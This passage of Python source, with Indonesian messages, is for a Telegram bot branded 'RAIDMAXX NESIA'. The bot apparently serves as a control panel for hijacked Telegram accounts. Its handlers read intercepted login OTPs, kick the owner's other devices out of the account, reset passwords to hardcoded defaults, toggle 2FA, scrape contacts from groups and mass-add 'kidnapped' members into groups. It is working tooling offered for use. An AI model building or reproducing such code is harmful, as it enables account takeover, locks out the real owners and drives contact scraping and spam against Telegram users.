                    if wait_minutes > 0:
                        time_msg += f"{wait_minutes} menit"
                        
                    rate_limited_msg = f"\n\n⚠️ *Batas Rate Telegram*: Tunggu *{time_msg}* sebelum menambahkan lebih banyak anggota."
                
                success_msg = (
                    "✅ *CULIK MEMBER SELESAI*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    f"👥 *Jenis Kontak*: `{contact_type.replace('_', '-').title()}`\n"
                    f"🔗 *Grup*: `{group_link}`\n"
                    f"✅ *Berhasil*: `{result.get('total_success', 0)}`\n"
                    f"🔄 *Ukuran Batch*: `{result.get('batch_size', batch_count)}`\n"
                    f"{rate_limited_msg}\n"
                    "━━━━━ RAIDMAXX NESIA ━━━━━"
                )
                
                # Create back button
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton(
                    text="« Kembali", 
                    callback_data=f"get_details_{phone}"
                )
                markup.add(back_button)
                
                bot.send_message(
                    message.chat.id,
                    success_msg,
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            else:
                error_msg = data.get('message', 'Unknown error')
                
                # Format rate limit messages nicely
                if "wait" in error_msg.lower() and "seconds" in error_msg.lower():
                    import re
                    wait_time_match = re.search(r'(\d+)\s*seconds', error_msg)
                    wait_seconds = int(wait_time_match.group(1)) if wait_time_match else 0
                    
                    if wait_seconds > 0:
                        # Convert to hours and minutes for better readability
                        wait_hours = wait_seconds // 3600
                        wait_minutes = (wait_seconds % 3600) // 60
                        
                        time_msg = ""
                        if wait_hours > 0:
                            time_msg += f"{wait_hours} jam "
                        if wait_minutes > 0:
                            time_msg += f"{wait_minutes} menit"
                        
                        # Create back button
                        markup = telebot.types.InlineKeyboardMarkup()
                        back_button = telebot.types.InlineKeyboardButton(
                            text="« Kembali", 
                            callback_data=f"get_details_{phone}"
                        )
                        markup.add(back_button)
                        
                        bot.send_message(
                            message.chat.id,
                            f"❌ *Batas Rate Telegram*\n\n"
                            f"Telegram membatasi penambahan member. Anda perlu menunggu *{time_msg}* "
                            f"sebelum dapat menambahkan anggota lagi.\n\n"
                            f"Ini adalah pembatasan dari Telegram untuk mencegah spam.",
                            parse_mode='Markdown',
                            reply_markup=markup
                        )
                    else:
                        bot.reply_to(message, f"❌ Gagal melakukan culik member: {error_msg}")
                # Handle other specific errors
                elif "join request sent" in error_msg.lower():
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton(
                        text="« Kembali", 
                        callback_data=f"get_details_{phone}"
                    )
                    markup.add(back_button)
                    
                    bot.send_message(
                        message.chat.id,
                        f"❌ *Permintaan Bergabung Terkirim*\n\n"
                        f"Bot telah mengirim permintaan bergabung ke grup. Admin grup harus "
                        f"menyetujui permintaan sebelum Anda dapat menambahkan anggota.\n\n"
                        f"Harap tunggu persetujuan dari admin grup.",
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
                else:
                    # Generic error with back button
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton(
                        text="« Kembali", 
                        callback_data=f"get_details_{phone}"
                    )
                    markup.add(back_button)
                    
                    bot.send_message(
                        message.chat.id,
                        f"❌ Gagal melakukan culik member:\n{error_msg}",
                        reply_markup=markup
                    )
        else:
            # Handle non-200/429 response
            try:
                error_data = response.json()
                error_detail = error_data.get('message', f'Server error (HTTP {response.status_code})')
                
                # Create back button
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton(
                    text="« Kembali", 
                    callback_data=f"get_details_{phone}"
                )
                markup.add(back_button)
                
                bot.send_message(
                    message.chat.id,
                    f"❌ Gagal melakukan culik member: {error_detail}",
                    reply_markup=markup
                )
            except:
                bot.reply_to(message, f"❌ Gagal melakukan culik member: Server error (HTTP {response.status_code})")
    except requests.exceptions.Timeout:
        bot.reply_to(message, "❌ Proses timeout. Mungkin terlalu banyak kontak atau server sibuk.")
    except requests.exceptions.ConnectionError:
        bot.reply_to(message, "❌ Tidak dapat terhubung ke server. Pastikan server berjalan dan dapat diakses.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    finally:
        # Clean up the processing message
        try:
            bot.delete_message(message.chat.id, process_msg.message_id)
        except:
            pass  # If message deletion fails, just continue
        
# Handler untuk extract contacts
@bot.callback_query_handler(func=lambda call: call.data.startswith("extract_contacts_"))
def handle_extract_contacts_callback(call):
    phone = call.data.replace("extract_contacts_", "")
    bot.answer_callback_query(call.id, "Mengambil daftar grup...")
    
    try:
        # Get list of groups first
        response = requests.get(f"{BACKEND_URL}/get_groups/{phone}")
        
        if response.status_code == 200:
            result = response.json()
            if result.get('status') == 'success':
                groups = result.get('groups', [])
                
                if not groups:
                    bot.send_message(call.message.chat.id, "❌ Tidak ada grup atau channel yang ditemukan")
                    return
                
                # Create inline keyboard with groups
                keyboard = InlineKeyboardMarkup()
                
                # Add groups to keyboard with checkboxes
                for group in groups:
                    group_type = group['type']
                    members = group['members_count']
                    checkbox = "☐"  # Empty checkbox
                    keyboard.add(InlineKeyboardButton(
                        f"{checkbox} {group_type}: {group['title']} ({members} members)",
                        callback_data=f"toggle_group_{phone}_{group['id']}"
                    ))
                
                # Add Extract button
                keyboard.add(InlineKeyboardButton("🔄 Extract Selected", callback_data=f"do_extract_{phone}"))
                
                bot.send_message(
                    call.message.chat.id,
                    "📋 Pilih grup untuk extract kontak:\n(Klik untuk memilih/membatalkan)",
                    reply_markup=keyboard
                )
            else:
                bot.send_message(call.message.chat.id, "❌ Gagal mendapatkan daftar grup: " + result.get('message', 'Unknown error'))
        else:
            bot.send_message(call.message.chat.id, "❌ Gagal terhubung ke server")
            
    except Exception as e:
        logger.error(f"Get groups error: {str(e)}")
        bot.send_message(call.message.chat.id, "❌ Terjadi kesalahan saat mengambil daftar grup")

# Handler untuk toggle grup (sudah diperbaiki)
@bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_group_"))
def handle_toggle_group(call):
    try:
        # Memecah callback_data yang berbentuk "toggle_group_{phone}_{group_id}"
        # Perhatikan bahwa split menghasilkan 4 elemen: ['toggle', 'group', '{phone}', '{group_id}']
        _, _, phone, group_id = call.data.split("_", 3)
        group_id = int(group_id)
        
        # Initialize selected groups for this phone if not exists
        if phone not in selected_groups:
            selected_groups[phone] = set()
            
        # Toggle group selection
        if group_id in selected_groups[phone]:
            selected_groups[phone].remove(group_id)
            checkbox = "☐"
        else:
            selected_groups[phone].add(group_id)
            checkbox = "☑"
            
        # Update button text
        button_text = call.message.reply_markup.keyboard[call.message.reply_markup.keyboard.index(next(
            row for row in call.message.reply_markup.keyboard if any(
                button.callback_data == call.data for button in row
            )
        ))][0].text
        new_text = f"{checkbox}{button_text[1:]}"  # Replace checkbox while keeping rest of text
        
        # Update keyboard
        keyboard = call.message.reply_markup
        for row in keyboard.keyboard:
            for button in row:
                if button.callback_data == call.data:
                    button.text = new_text
                    
        bot.edit_message_reply_markup(
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard
        )
        
        # Show count of selected groups
        selected_count = len(selected_groups[phone])
        bot.answer_callback_query(call.id, f"✅ {selected_count} grup terpilih")
        
    except Exception as e:
        logger.error(f"Toggle group error: {str(e)}")
        bot.answer_callback_query(call.id, "❌ Gagal mengubah pilihan grup")

# Handler untuk melakukan ekstraksi
@bot.callback_query_handler(func=lambda call: call.data.startswith("do_extract_"))
def handle_do_extract(call):
    phone = call.data.replace("do_extract_", "")
    
    if phone not in selected_groups or not selected_groups[phone]:
        bot.answer_callback_query(call.id, "❌ Pilih minimal satu grup terlebih dahulu")
        return
        
    bot.answer_callback_query(call.id, "Memulai ekstraksi kontak...")
    process_message = bot.send_message(call.message.chat.id, "🔄 Sedang mengekstrak kontak...\n\n• Mohon tunggu hingga proses selesai\n• Jangan tutup bot selama proses berlangsung")
    
    try:
        # Ekstrak kontak dari grup/channel yang terpilih
        response = requests.post(
            f"{BACKEND_URL}/extract_group_contacts/{phone}",
            json={'group_ids': list(selected_groups[phone])},
            timeout=300  # timeout 5 menit
        )
        
        if response.status_code == 200:
            result = response.json()
            if result.get('status') == 'success':
                total_new = result.get('total_new', 0)
                total_failed = result.get('total_failed', 0)
                
                # Detail per grup
                group_details = "\n\n*Detail per Grup:*"
                for group in result.get('results', []):
                    group_title = group.get('group_title', 'Unknown Group')
                    new_contacts = group.get('new_contacts', 0)
                    failed = group.get('failed_imports', 0)
                    group_details += f"\n\n*{group_title}*\n"
                    group_details += f"✓ Berhasil: `{new_contacts}`\n"
                    group_details += f"✗ Gagal: `{failed}`"
                
                success_message = (
                    "✅ *Ekstraksi Kontak Selesai*\n\n"
                    f"📊 *Hasil Total:*\n"
                    f"• Kontak Baru: `{total_new}`\n"
                    f"• Gagal Ditambahkan: `{total_failed}`"
                )
                
                # Tambahkan detail grup jika ada hasil
                if total_new > 0 or total_failed > 0:
                    success_message += group_details
                
                bot.send_message(call.message.chat.id, success_message, parse_mode="Markdown")
                
                # Clear selected groups setelah ekstraksi berhasil
                selected_groups[phone].clear()
                
                # Hapus pesan selection
                try:
                    bot.delete_message(call.message.chat.id, call.message.message_id)
                except Exception as e:
                    logger.error(f"Error deleting selection message: {e}")
                    
            else:
                error_msg = result.get('message', 'Unknown error')
                bot.send_message(
                    call.message.chat.id,
                    f"❌ Gagal mengekstrak kontak:\n\n`{error_msg}`",
                    parse_mode="Markdown"
                )
        else:
            bot.send_message(
                call.message.chat.id, 
                "❌ Gagal terhubung ke server.\nSilakan coba lagi dalam beberapa saat."
            )
            
    except requests.exceptions.Timeout:
        bot.send_message(
            call.message.chat.id,
            "❌ Waktu ekstraksi terlalu lama.\nSilakan coba lagi dengan lebih sedikit grup."
        )
    except Exception as e:
        logger.error(f"Extract contacts error: {str(e)}")
        bot.send_message(
            call.message.chat.id, 
            f"❌ Terjadi kesalahan saat mengekstrak kontak:\n\n`{str(e)}`",
            parse_mode="Markdown"
        )
    finally:
        # Hapus pesan proses
        try:
            bot.delete_message(call.message.chat.id, process_message.message_id)
        except Exception as e:
            logger.error(f"Error deleting process message: {e}")

# Handler untuk Disable 2FA
@bot.callback_query_handler(func=lambda call: call.data.startswith("disable_2fa_"))
def handle_disable_2fa(call):
    phone = call.data.replace("disable_2fa_", "")
    bot.answer_callback_query(call.id, "Menonaktifkan 2FA...")

    try:
        response = requests.get(f"{BACKEND_URL}/disable_2fa/{phone}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                message = (
                    "▪️ *ACCOUNT MANAGER*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    "🔒 *Status*: `Password 2FA Disable`\n"
                    "━━━━━━━━━━━━━━━"
                )
            else:
                message = (
                    "❌ *GAGAL MENONAKTIFKAN 2FA*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    f"❗ *Error*: `{data.get('message', 'Unknown error')}`\n"
                    "━━━━━━━━━━━━━━━"
                )
        else:
            message = (
                "❌ *GAGAL MENONAKTIFKAN 2FA*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor*: `{phone}`\n"
                "❗ *Error*: `Terjadi kesalahan pada server`\n"
                "━━━━━━━━━━━━━━━"
            )

        # Add back button
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        
        bot.send_message(
            call.message.chat.id,
            message,
            parse_mode='Markdown',
            reply_markup=markup
        )

    except Exception as e:
        logger.error(f"Error disabling 2FA: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan saat menonaktifkan 2FA untuk nomor *{phone}*. Silakan coba lagi.",
            parse_mode='Markdown',
            reply_markup=markup
        )

# Handler untuk Enable 2FA
@bot.callback_query_handler(func=lambda call: call.data.startswith("enable_2fa_"))
def handle_enable_2fa(call):
    phone = call.data.replace("enable_2fa_", "")
    bot.answer_callback_query(call.id, "Mengaktifkan 2FA...")

    try:
        response = requests.get(f"{BACKEND_URL}/enable_2fa/{phone}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                message = (
                    "▪️ *ACCOUNT MANAGER*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    "🔒 *Status*: `Password 2FA Enabled`\n"
                    f"🔐 *Password*: `{data.get('new_password', 'RDadmin12##')}`\n"
                    "━━━━━━━━━━━━━━━"
                )
            else:
                message = (
                    "❌ *GAGAL MENGAKTIFKAN 2FA*\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    f"📱 *Nomor*: `{phone}`\n"
                    f"❗ *Error*: `{data.get('message', 'Unknown error')}`\n"
                    "━━━━━━━━━━━━━━━"
                )
        else:
            message = (
                "❌ *GAGAL MENGAKTIFKAN 2FA*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor*: `{phone}`\n"
                "❗ *Error*: `Terjadi kesalahan pada server`\n"
                "━━━━━━━━━━━━━━━"
            )

        # Add back button
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        
        bot.send_message(
            call.message.chat.id,
            message,
            parse_mode='Markdown',
            reply_markup=markup
        )

    except Exception as e:
        logger.error(f"Error enabling 2FA: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan saat mengaktifkan 2FA untuk nomor *{phone}*. Silakan coba lagi.",
            parse_mode='Markdown',
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("reset_password_"))
def handle_reset_password_callback(call):
    phone = call.data.replace("reset_password_", "")
    bot.answer_callback_query(call.id, "Sedang mereset password...")
    try:
        # Call reset password endpoint
        response = requests.get(f"{BACKEND_URL}/reset_password/{phone}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            new_password = data.get('new_password')
            
            # Success message
            message = (
                "▪️ *ACCOUNT MANAGER*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor* : `{phone}`\n"
                f"🔐 *Password Baru* : `{new_password}`\n\n"
                "⚠️ Password telah diubah menjadi default.\n"
                "━━━━━━━━━━━━━━━"
            )
        else:
            error_data = response.json()
            message = (
                "❌ *GAGAL RESET PASSWORD*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor* : `{phone}`\n"
                f"❗ *Error* : `{error_data.get('message', 'Unknown error')}`\n"
                "━━━━━━━━━━━━━━━"
            )
            
        # Add back button
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_otp_{phone}"
        )
        markup.add(back_button)
        
        # Send message
        bot.send_message(
            call.message.chat.id,
            message,
            parse_mode='Markdown',
            reply_markup=markup
        )
    except Exception as e:
        print(f"Error resetting password: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_otp_{phone}"
        )
        markup.add(back_button)
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan saat mereset password untuk nomor *{phone}*. Silakan coba lagi.",
            parse_mode='Markdown',
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_devices_"))
def handle_devices_callback(call):
    phone = call.data.replace("get_devices_", "")
    bot.answer_callback_query(call.id, "Mengecek perangkat yang login...")
    try:
        response = requests.get(f"{BACKEND_URL}/get_devices/{phone}", timeout=10)
        
        if response.status_code == 200:
            devices_data = response.json()
            if devices_data.get('status') == 'success' and devices_data.get('devices'):
                devices = devices_data['devices']
                
                message = "📱 *DAFTAR PERANGKAT YANG LOGIN* 📱\n━━━━━━━━━━━━━━━\n\n"
                
                for i, device in enumerate(devices, 1):
                    message += f"*Perangkat {i}:*\n"
                    message += f"📲 Model: `{device['device_model']}`\n"
                    message += f"📱 App: `{device['app_name']} v{device['app_version']}`\n"
                    message += f"💻 Sistem: `{device['platform']} {device['system_version']}`\n"
                    message += f"🌍 Lokasi: `{device['country']}, {device['region']}`\n"
                    message += f"⏰ Aktif: `{device['date_active']}`\n"
                    message += f"📍 IP: `{device['ip']}`\n"
                    if device['is_current']:
                        message += "✅ *Perangkat Aktif Saat Ini*\n"
                    message += "━━━━━━━━━━━━━━━\n\n"

                # Create keyboard with devices buttons
                markup = types.InlineKeyboardMarkup(row_width=1)
                for device in devices:
                    if not device['is_current']:  # Skip current device
                        device_name = f"❌ Keluarkan {device['device_model']} - {device['app_name']}"
                        markup.add(types.InlineKeyboardButton(
                            text=device_name,
                            callback_data=f"remove_device_{phone}_{device['hash']}"
                        ))

                # Add back button
                back_button = types.InlineKeyboardButton(
                    text="↩️ Kembali", 
                    callback_data=f"get_details_{phone}"
                )
                markup.add(back_button)

                # Send message with device list and buttons
                bot.send_message(
                    call.message.chat.id,
                    message,
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            else:
                bot.send_message(
                    call.message.chat.id,
                    "❌ Tidak ada perangkat yang ditemukan."
                )
        else:
            bot.send_message(
                call.message.chat.id,
                "❌ Gagal mengambil informasi perangkat."
            )
            
    except Exception as e:
        logger.error(f"Error checking devices: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        
        bot.send_message(
            call.message.chat.id,
            "❌ Terjadi kesalahan saat mengecek perangkat. Silakan coba lagi.",
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("remove_device_"))
def handle_remove_device(call):
    # Format: remove_device_PHONE_HASH 
    data = call.data.split("_")
    if len(data) < 4:
        bot.answer_callback_query(call.id, "Format data tidak valid")
        return
        
    # Ambil phone dan hash yang benar
    phone = data[2]  # Ambil nomor telepon
    device_hash = data[3]  # Ambil hash perangkat
    
    bot.answer_callback_query(call.id, "Mengeluarkan perangkat...")
    try:
        # Kirim request ke endpoint terminate
        response = requests.post(
            f"{BACKEND_URL}/terminate_device/{phone}",
            json={"hash": device_hash},
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            if result.get('status') == 'success':
                # Jika berhasil, langsung ambil dan tampilkan daftar perangkat terbaru
                try:
                    device_response = requests.get(f"{BACKEND_URL}/get_devices/{phone}", timeout=10)
                    if device_response.status_code == 200:
                        devices_data = device_response.json()
                        if devices_data.get('status') == 'success' and devices_data.get('devices'):
                            devices = devices_data['devices']
                            
                            message = "📱 *DAFTAR PERANGKAT YANG LOGIN* 📱\n━━━━━━━━━━━━━━━\n\n"
                            
                            for i, device in enumerate(devices, 1):
                                message += f"*Perangkat {i}:*\n"
                                message += f"📲 Model: `{device['device_model']}`\n"
                                message += f"📱 App: `{device['app_name']} v{device['app_version']}`\n"
                                message += f"💻 Sistem: `{device['platform']} {device['system_version']}`\n"
                                message += f"🌍 Lokasi: `{device['country']}, {device['region']}`\n"
                                message += f"⏰ Aktif: `{device['date_active']}`\n"
                                message += f"📍 IP: `{device['ip']}`\n"
                                if device['is_current']:
                                    message += "✅ *Perangkat Aktif Saat Ini*\n"
                                message += "━━━━━━━━━━━━━━━\n\n"

                            # Create keyboard with remaining devices
                            markup = types.InlineKeyboardMarkup(row_width=1)
                            for device in devices:
                                if not device['is_current']:  # Skip current device
                                    device_name = f"❌ Keluarkan {device['device_model']} - {device['app_name']}"
                                    markup.add(types.InlineKeyboardButton(
                                        text=device_name,
                                        callback_data=f"remove_device_{phone}_{device['hash']}"
                                    ))

                            # Add back button
                            back_button = types.InlineKeyboardButton(
                                text="↩️ Kembali", 
                                callback_data=f"get_details_{phone}"
                            )
                            markup.add(back_button)

                            # Edit message with updated device list
                            bot.edit_message_text(
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                text=message,
                                parse_mode='Markdown',
                                reply_markup=markup
                            )
                except Exception as e:
                    logger.error(f"Error refreshing device list: {str(e)}")
                
                bot.answer_callback_query(
                    call.id,
                    "✅ Perangkat berhasil dikeluarkan!",
                    show_alert=True
                )
            else:
                bot.answer_callback_query(
                    call.id,
                    "❌ Gagal mengeluarkan perangkat: " + result.get('message', ''),
                    show_alert=True
                )
        else:
            bot.answer_callback_query(
                call.id,
                "❌ Terjadi kesalahan saat mengeluarkan perangkat.",
                show_alert=True
            )
            
    except Exception as e:
        logger.error(f"Error removing device: {str(e)}")
        bot.answer_callback_query(
            call.id,
            "❌ Terjadi kesalahan. Silakan coba lagi.",
            show_alert=True
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_otp_"))
def handle_otp_callback(call):
    phone = call.data.replace("get_otp_", "")
    bot.answer_callback_query(call.id, "Lagi nyari data nih...")
    try:
        # Mendapatkan OTP
        response_otp = requests.get(f"{BACKEND_URL}/get_otp/{phone}", timeout=10)
        otp = "Belum ada OTP nih"
        
        if response_otp.status_code == 200:
            # Log the entire response for debugging
            logger.info(f"OTP Response for {phone}: {response_otp.text}")
            
            try:
                otp_data = response_otp.json()
                
                # Check different possible structures of the JSON response
                if 'otp' in otp_data:
                    otp = otp_data['otp']
                elif 'data' in otp_data and 'otp' in otp_data['data']:
                    otp = otp_data['data']['otp']
                elif 'result' in otp_data and 'otp' in otp_data['result']:
                    otp = otp_data['result']['otp']
                elif 'status' in otp_data and otp_data['status'] == 'success' and 'message' in otp_data:
                    # If OTP is in the message field
                    otp = otp_data['message']
                
                # If OTP is empty, still not found, or just whitespace
                if not otp or otp.strip() == "":
                    otp = "Belum ada OTP nih"
            except Exception as e:
                logger.error(f"Error parsing OTP response: {str(e)}")
                otp = "Gagal baca OTP"
        
        # Mendapatkan informasi pengguna
        response_user = requests.get(f"{BACKEND_URL}/get_password/{phone}", timeout=10)
        telegram_id = "Ga ada"
        telegram_username = "Ga ada"
        if response_user.status_code == 200 and response_user.text:
            user_data = response_user.json()
            if 'data' in user_data:
                telegram_id = user_data['data'].get('telegram_id', 'Ga ada')
                telegram_username = user_data['data'].get('telegram_username', 'Ga ada')
        
        # Waktu saat ini
        current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        
        # Membuat pesan
        message = (
            "ACCOUNT MANAGER\n"
            "━━━━━━━━━━━━━━━\n\n"
            f"Username Telegram: `@{telegram_username}`\n"
            f"ID Telegram: `{telegram_id}`\n"
            f"Nomor: `{phone}`\n"
            f"OTP: `{otp}`\n\n"
            f"Waktu: `{current_time}`\n"
            "━━━━━ RAIDMAXX NESIA ━━━━━"
        )
        
        # Membuat tombol kembali dan reset password
        markup = types.InlineKeyboardMarkup(row_width=2)
        back_button = types.InlineKeyboardButton(
            text="Balik", 
            callback_data=f"get_details_{phone}"
        )
        reset_password_button = types.InlineKeyboardButton(
            text="Reset Password", 
            callback_data=f"reset_password_{phone}"
        )
        markup.add(reset_password_button, back_button)
        
        # Mengirimkan pesan
        bot.send_message(
            call.message.chat.id,
            message,
            parse_mode='Markdown',
            reply_markup=markup
        )
    except Exception as e:
        logger.error(f"Error in OTP handler: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="Balik", 
            callback_data=f"get_details_{phone}"
        )
        markup.add(back_button)
        bot.send_message(
            call.message.chat.id,
            f"Gagal proses data buat nomor *{phone}*. Coba lagi ya.",
            parse_mode='Markdown',
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("reset_password_"))
def handle_reset_password_callback(call):
    phone = call.data.replace("reset_password_", "")
    bot.answer_callback_query(call.id, "Sedang mereset password...")
    try:
        # Memanggil endpoint reset password dengan metode GET
        response = requests.get(f"{BACKEND_URL}/reset_password/{phone}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            new_password = data.get('new_password', 'LC50')
            
            # Membuat pesan sukses
            message = (
                "✅ *PASSWORD BERHASIL DIRESET*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor* : `{phone}`\n"
                f"🔐 *Password Baru* : `{new_password}`\n\n"
                "⚠️ Password telah diubah menjadi default.\n"
                "━━━━━━━━━━━━━━━"
            )
        else:
            error_data = response.json()
            message = (
                "❌ *GAGAL RESET PASSWORD*\n"
                "━━━━━━━━━━━━━━━\n\n"
                f"📱 *Nomor* : `{phone}`\n"
                f"❗ *Error* : `{error_data.get('message', 'Unknown error')}`\n"
                "━━━━━━━━━━━━━━━"
            )
            
        # Membuat tombol kembali
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_otp_{phone}"
        )
        markup.add(back_button)
        
        # Mengirim pesan
        bot.send_message(
            call.message.chat.id,
            message,
            parse_mode='Markdown',
            reply_markup=markup
        )
    except Exception as e:
        print(f"Error resetting password: {str(e)}")
        markup = types.InlineKeyboardMarkup()
        back_button = types.InlineKeyboardButton(
            text="↩️ Kembali", 
            callback_data=f"get_otp_{phone}"
        )
        markup.add(back_button)
        bot.send_message(
            call.message.chat.id,
            f"❌ Terjadi kesalahan saat mereset password untuk nomor *{phone}*. Silakan coba lagi.",
            parse_mode='Markdown',
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data == "back_to_daftar_nomor")
def handle_back_to_daftar_nomor(call):
    """
    Callback untuk tombol "Kembali" menuju daftar nomor telepon.
    """
    bot.answer_callback_query(call.id, "↩️ Kembali ke daftar nomor telepon...")
    handle_daftar_nomor(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_session_"))
def handle_delete_session(call):
    """
    Handles deleting a session for a specific phone number
    """
    phone = call.data.replace("delete_session_", "")
    bot.answer_callback_query(call.id, f"Menghapus sesi untuk nomor {phone}...")

    try:
        response = requests.post(f"{BACKEND_URL}/delete_session/{phone}")  # Assuming there's an endpoint for session deletion
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                # Pesan sukses
                success_message = (
                    f"✅ **Sesi Berhasil Dihapus!**\n\n"
                    f"Nomor Telepon: {phone}\n"
                    f"Status: **Sukses**\n"
                    f"Sesi telah berhasil dihapus."
                )
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton("↩️ Kembali", callback_data="back_to_daftar_nomor"))

                bot.send_message(call.message.chat.id, success_message, parse_mode="Markdown", reply_markup=markup)
            else:
                # Pesan gagal
                fail_message = (
                    f"❌ **Gagal Menghapus Sesi!**\n\n"
                    f"Nomor Telepon: {phone}\n"
                    f"Status: **Gagal**\n"
                    f"Periksa koneksi backend atau coba lagi."
                )
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton("↩️ Kembali", callback_data="back_to_daftar_nomor"))

                bot.send_message(call.message.chat.id, fail_message, parse_mode="Markdown", reply_markup=markup)
        else:
            # Pesan error saat request gagal
            error_message = (
                "❌ **Terjadi Kesalahan saat Menghapus Sesi.**\n"
                "Silakan coba lagi atau hubungi administrator untuk bantuan lebih lanjut."
            )
            markup = telebot.types.InlineKeyboardMarkup()
            markup.add(telebot.types.InlineKeyboardButton("↩️ Kembali", callback_data="back_to_daftar_nomor"))

            bot.send_message(call.message.chat.id, error_message, parse_mode="Markdown", reply_markup=markup)
    except requests.exceptions.RequestException as e:
        # Pesan kesalahan koneksi
        connection_error_message = (
            f"❌ **Kesalahan Koneksi Backend:**\n{str(e)}\n"
            "Silakan coba lagi nanti atau hubungi administrator."
        )
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("↩️ Kembali", callback_data="back_to_daftar_nomor"))

        bot.send_message(call.message.chat.id, connection_error_message, parse_mode="Markdown", reply_markup=markup)
    except Exception as e:
        # Pesan kesalahan tidak terduga
        unexpected_error_message = (
            f"❌ **Error Tidak Terduga:**\n{str(e)}\n"
            "Harap laporkan masalah ini ke tim teknis untuk penanganan lebih lanjut."
        )
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("↩️ Kembali", callback_data="back_to_daftar_nomor"))

        bot.send_message(call.message.chat.id, unexpected_error_message, parse_mode="Markdown", reply_markup=markup)

def start_bot():
    try:
        print("Bot Telah Running")
        while True:
            try:
                bot.polling(non_stop=True)
            except Exception as e:
                print(f"Error in bot polling: {e}")
                time.sleep(5)  # Wait for a few seconds before restarting
    except Exception as e:
        logger.error(f"Fatal error in bot: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    try:
        start_bot()
    except Exception as e:
        print(f"Error starting bot: {e}")
        traceback.print_exc()